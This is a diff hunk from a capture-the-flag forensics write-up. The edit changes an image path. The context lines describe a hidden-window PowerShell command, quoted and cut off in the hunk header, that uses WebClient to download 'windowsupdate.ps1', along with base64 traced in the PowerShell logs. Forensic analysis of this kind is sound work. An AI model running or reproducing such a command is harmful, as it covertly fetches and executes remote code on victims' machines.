@@ -35,7 +35,7 @@ CMD.EXE /c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).Downloa
 ```
 This can also be viewed on any.run when importing the file
 
-{{< img src="idek-CTF-2022/anyrunoutput.png" >}}
+{{< img src="anyrunoutput.png" >}}
 
 This malicious command seems to have downloaded a file called `windowsupdate.ps1`. I searched this string in Autopsy, and found a command where a very long base64 string was downloaded from the Powershell logs. Decoding the b64 we an object that starts with:
 ```
